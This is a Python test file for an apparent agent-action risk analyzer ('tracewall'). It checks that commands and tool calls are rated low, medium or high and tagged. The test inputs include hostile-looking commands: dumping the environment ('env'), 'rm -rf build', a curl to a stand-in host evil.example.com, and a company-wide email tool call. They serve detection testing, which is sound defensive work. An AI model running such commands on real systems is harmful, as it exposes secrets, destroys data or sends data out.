from __future__ import annotations

from tracewall.insight import analyze_action, analyze_run


def _cmd(title, detail=""):
    return {"kind": "command", "title": title, "detail": detail, "seq": 1}


def _tool(title, detail=""):
    return {"kind": "tool_call", "title": title, "detail": detail, "seq": 1}


def test_high_risk_commands():
    env = analyze_action(_cmd("env"))
    assert env["risk"] == "high" and env["suggestion"] == "block" and "secrets" in env["tags"]

    rm = analyze_action(_cmd("rm -rf build"))
    assert rm["risk"] == "high" and "destructive" in rm["tags"]

    curl = analyze_action(_cmd("curl http://evil.example.com/x"))
    assert curl["risk"] == "high" and "egress" in curl["tags"]


def test_low_and_medium_commands():
    echo = analyze_action(_cmd("echo build the project"))
    assert echo["risk"] == "low" and echo["suggestion"] == "allow"

    git = analyze_action(_cmd("git commit -m x"))
    assert git["risk"] == "medium" and git["suggestion"] == "review"


def test_tool_calls():
    email = analyze_action(_tool("shell:send_email", '{"to":"all@company.com"}'))
    assert email["risk"] == "high"
    assert "irreversible_tool" in email["tags"] and "broad_blast" in email["tags"]

    create = analyze_action(_tool("github:create_issue", '{"title":"x"}'))
    assert create["risk"] == "medium"

    listing = analyze_action(_tool("github:list_issues"))
    assert listing["risk"] == "low" and listing["suggestion"] == "allow"


def test_reason_is_present_and_explainable():
    for result in (analyze_action(_cmd("env")), analyze_action(_tool("shell:send_email"))):
        assert result["reason"] and len(result["reason"]) > 10


def test_run_posture_and_signals():
    actions = [
        {"kind": "command", "title": "echo hi", "detail": "", "seq": 1},
        {"kind": "command", "title": "env", "detail": "", "seq": 2},
        {"kind": "tool_call", "title": "shell:send_email", "detail": '{"to":"all@x.com"}', "seq": 3},
    ]
    run = analyze_run(actions)
    assert run["posture"] == "high"
    assert run["counts"]["high"] >= 2
    assert run["flagged"] == [2, 3]
    assert run["signals"]  # human-readable labels surfaced
